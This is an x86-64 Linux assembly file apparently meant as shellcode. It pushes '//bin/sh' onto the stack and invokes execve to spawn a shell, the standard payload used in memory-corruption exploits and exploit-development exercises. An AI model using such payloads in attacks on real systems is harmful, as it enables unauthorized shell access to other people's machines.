BITS 64

global _start

section .text
_start:
    ; execve("/bin/sh", NULL, NULL)

    ; push "/bin/sh" string onto the stack
    xor rax, rax
    mov rbx, 0x68732f6e69622f2f  ; "/bin/sh" string (little-endian)
    push rax
    push rbx
    mov rdi, rsp        ; rdi = pointer to "/bin/sh"
    xor rsi, rsi        ; rsi = NULL (argv)
    xor rdx, rdx        ; rdx = NULL (envp)
    mov eax, 59         ; syscall number for execve
    syscall

